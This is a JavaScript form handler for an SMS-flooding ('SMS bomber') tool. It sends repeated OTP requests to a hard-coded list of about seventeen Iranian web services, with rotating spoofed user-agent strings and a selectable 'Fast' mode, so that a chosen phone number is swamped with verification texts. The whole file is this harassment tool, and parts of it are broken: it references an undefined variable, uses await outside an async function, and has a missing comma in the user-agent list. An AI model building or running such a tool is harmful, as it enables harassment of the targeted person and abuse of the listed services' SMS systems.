document.getElementById('smsForm').addEventListener('submit', function(e) {
  e.preventDefault();

  const phoneNumber = document.getElementById('phoneNumber').value;
  const mood = document.getElementById('mood').value;

  const sites = [
	{
        "site": "khodro45",
        "url": "https://khodro45.com/api/v1/customers/otp/",
        "json": {"mobile":"0" + number}
    },
  {
        "site": "Alibaba",
        "url": "https://ws.alibaba.ir/api/v3/account/mobile/otp",
        "json": {"phoneNumber": number}
    },
    {
         "site": "BM",
        "url": "https://mobapi.banimode.com/api/v2/auth/request",
        "json": {"phone":"0" + number}
    },
   {
        "site": "Hamrah Doctor",
        "url": "https://base.ecg-api.hamrahdoctor.com/auth/app/user/otp",
        "json": {"phoneNumber":"+98" + number}
    },
   {
        "site": "okala",
        "url": "https://apigateway.okala.com/api/voyager/C/CustomerAccount/OTPRegister",
        "json": {"mobile":"0" + number}
    },
    {
        "site": "Safar Market",
        "url": "https://safarmarket.com//api/security/v2/user/otp",
        "json": {"phone":"0" + number}
    },
    {
        "site": "az ki",
        "url": "https://api.azkivam.com/auth/login",
        "json": {"mobileNumber":"0" + number}
    },
    {
        "site": "pindo",
        "url": "https://api.pindo.ir/v1/user/login-register/",
        "json": {"phone":"0" + number}
    },
    {
        "site": "vitrin.shop",
        "url": "https://www.vitrin.shop/api/v1/user/request_code",
        "json": {"phone_number":"0" + number}
    },
    {
        "site": "kukala",
        "url": "https://api.kukala.ir/api/user/Otp",
        "json": {"phoneNumber":"0" + number}
    },
    {
        "site": "zigap",
        "url": "https://zigap.smilinno-dev.com/api/v1.6/authenticate/sendotp",
        "json": {"phoneNumber":"+98" + number}
    },
    {
        "site": "pinorest",
        "url": "https://api.pinorest.com/frontend/auth/login/mobile",
        "json": {"mobile":"0" + number}
    },
    {
        "site": "telewebion",
        "url": "https://gateway.telewebion.com/shenaseh/api/v2/auth/step-one",
        "json": {"code":"98","phone": number,"smsStatus":"default"}
    },
    {
        "site": "itoll",
        "url": "https://app.itoll.com/api/v1/auth/login",
        "json": {"mobile":"0" + number}
    },
    {
        "site": "z pal",
        "url": "https://next.zarinpal.com/api/oauth/register",
        "json": {"first_name":"sdlom,pl","last_name":"sdvsdv","cell_number":"0" + number}
    },
	{
        "site": "z pal",
        "url": "https://next.zarinpal.com/api/oauth/initialize",
        "json": {"username":"0" + number}
    },
    {
        "site": "booking",
        "url": "https://www.booking.ir/fa/v2/senddynamicmobilepassword/",
        "json": {"mobile":"0" + number}
    },];

  const userAgents = [
    'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:118.0) Gecko/20100101 Firefox/118.0',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15',
    'Mozilla/5.0 (X11; Linux x86_64; rv:118.0) Gecko/20100101 Firefox/118.0',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36',
    'Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:118.0) Gecko/20100101 Firefox/118.0',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Safari/605.1',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.'
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:91.0) Gecko/20100101 Firefox/91.0',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/605.1.15',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.3904.97 Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.3904.97 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/534.57.2 (KHTML, like Gecko) Chrome/118.0.3904.97 Safari/534.57.2',
    'Mozilla/5.0 (iPad; CPU OS 15_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/604.1.38 (KHTML, like Gecko) Version/15.0 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/604.1.38 (KHTML, like Gecko) Version/16.0 Safari/604.1',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; Trident/7.0; rv:11.0) like Gecko',
    'Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_15_7; en-us) AppleWebKit/533.21.1 (KHTML, like Gecko) Version/16.0 Safari/533.21.1',
    'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:92.0) Gecko/20100101 Firefox/92.0',
    'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.3904.97 Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0',
    'Mozilla/5.0 (X11; Linux i686; rv:91.0) Gecko/20100101 Firefox/91.0',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko)',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 11_2_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.3904.108 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko',
    'Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.3904.97 Safari/537.36',
    'Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.3904.97 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 11_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.3 Safari/605.1.15'
 ];

  const userAgent = userAgents[Math.floor(Math.random() * userAgents.length)];

  let rounds, delay, roundDelay;

  if (mood === '1') {
    rounds = 2;
    delay = 3500;
    roundDelay = 1000;
  } else if (mood === '2') {
    rounds = 3;
    delay = 500;
    roundDelay = 1000;
  } else {
    alert('Invalid mood. Please select Normal or Fast.');
    return;
  }

  const responseDiv = document.getElementById('response');
  responseDiv.innerHTML = '';

  for (let round = 0; round < rounds; round++) {
    sites.forEach(site => {
      const url = site.url;
      const json = site.json;

      const headers = { 'User-Agent': userAgent };

      const startTime = Date.now();

      fetch(url, {
        method: 'POST',
        headers: headers,
        body: JSON.stringify(json)
      })
        .then(response => {
          const endTime = Date.now();
          const duration = endTime - startTime;

          const responseText = `Response from site ${site.site} in round ${round + 1}: ${response.status}`;
          const responseElement = document.createElement('p');
          responseElement.textContent = responseText;
          responseDiv.appendChild(responseElement);

          return new Promise(resolve => setTimeout(resolve, delay));
        })
        .catch(error => {
          console.error('Error:', error);
        });
    });

    await new Promise(resolve => setTimeout(resolve, roundDelay));
  }
});
